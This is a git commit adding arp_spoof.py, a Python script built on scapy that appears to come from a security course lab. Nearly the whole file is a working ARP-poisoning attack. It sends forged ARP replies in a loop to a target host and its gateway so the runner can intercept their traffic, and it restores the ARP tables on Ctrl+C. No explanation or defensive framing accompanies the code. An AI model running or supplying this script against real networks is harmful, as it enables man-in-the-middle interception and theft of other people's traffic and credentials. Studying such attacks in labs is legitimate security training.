78793d6aebf6ed446a11f24eb38862f65198383a
Jacob_Bocotan <44646431+kingjacob2020@users.noreply.github.com>
2020-12-28 22:55:29 +0000

    Create arp_spoof.py

---
+++ arp_spoof.py
@@ -0,0 +1,85 @@
+#!/usr/bin/env python
+
+
+
+import time
+
+import scapy.all as scapy
+
+import sys
+
+#no need for importing sys in python 3
+
+
+
+def get_mac(ip):
+
+    arp_request = scapy.ARP(pdst=ip)
+
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+
+    arp_request_broadcast = broadcast/arp_request
+
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+
+
+
+    return answered_list[0][1].hwsrc
+
+
+
+def spoof(target_ip, spoof_ip):
+
+    target_mac = get_mac(target_ip)
+
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+
+    scapy.send(packet, verbose=False)
+
+
+
+def restore(destination_ip, source_ip):
+
+    destination_mac = get_mac(destination_ip)
+
+    source_mac = get_mac(source_ip)
+
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+
+    scapy.send(packet, count=4, verbose=False)
+
+
+
+target_ip = '10.0.2.9'
+
+gateway_ip = '10.0.2.1'
+
+
+
+sent_packets_count = 0
+
+try:
+
+    while True:
+
+        spoof('10.0.2.9', '10.0.2.1')
+
+        spoof('10.0.2.1', '10.0.2.9')
+
+        sent_packets_count = sent_packets_count + 2
+
+        print('\r[+] Sent two packets: ' + str(sent_packets_count)),
+
+        sys.stdout.flush()
+
+        time.sleep(2)
+
+except KeyboardInterrupt:
+
+    print('\n[-] Detected CTRL + C ..... Resetting ARP tables..... Please wait.\n')
+
+    restore(target_ip, gateway_ip)
+
+    restore(gateway_ip, target_ip)
+
+    #press CTRL + C to end the script
